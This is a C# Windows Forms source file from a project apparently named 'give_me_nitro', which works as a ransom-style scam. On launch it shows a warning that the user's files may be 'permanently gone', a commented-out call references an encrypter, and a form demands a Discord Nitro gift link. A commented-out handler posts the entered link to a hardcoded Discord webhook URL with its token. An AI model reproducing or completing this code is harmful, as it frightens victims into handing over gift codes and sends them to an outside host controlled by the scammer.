using System;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace give_me_nitro
{
    public partial class Interface : Form
    {
        public Interface()
        {
            //encrypter.dummy();
            InitializeComponent();
        }
        private void Interface_Shown(object sender, EventArgs e)
        {

            new Thread(() => { MessageBox.Show("IF YOU CLOSE THIS WINDOW, YOUR FILES MIGHT BE PERMANENTLY GONE!", "IMPORTANT"); }).Start();
        }
        private void Send_bnt_Click(object sender, EventArgs e)
        {
            string link = Payment_txt_box.Text;
            string[] linkSplit = link.Split("/");

            //switch (linkSplit.Length)
            //{
            //    case 2:
            //        if (linkSplit[0] == "discord.gift" && linkSplit[1] != "")
            //        {
            //            linkerror.Visible = false;
            //            WebClient WebClient = new WebClient();
            //            WebClient.UploadValues("https://ptb.discord.com/api/webhooks/889156500398936105/G6BcAHmYlOhYs9rQCvHP7Fsqm3fvlSqCmcB4oMQeInr09vdumMU_ZhDiynQ6Egx961vF", new System.Collections.Specialized.NameValueCollection() { { "username", "HERE IS THE SHEEEEEESH" }, { "content", " NITRO!!!!!: https://" + link } });
            //        }
            //        else { linkerror.Visible = true; }
            //        break;
            //    case 4:
            //        if (linkSplit[0] == "https" && linkSplit[2] == "discord.gift" && linkSplit[3] != "")
            //        {
            //            linkerror.Visible = false;
            //            WebClient WebClient = new WebClient();
            //            WebClient.UploadValues("https://ptb.discord.com/api/webhooks/889156500398936105/G6BcAHmYlOhYs9rQCvHP7Fsqm3fvlSqCmcB4oMQeInr09vdumMU_ZhDiynQ6Egx961vF", new System.Collections.Specialized.NameValueCollection() { { "username", "HERE IS THE SHEEEEEESH" }, { "content", " NITRO!!!!!: " + link } });
            //        }
            //        else { linkerror.Visible = true; }
            //        break;
            //    default:
            //        linkerror.Visible = true;
            //        break;
            //}
        }
    }
}
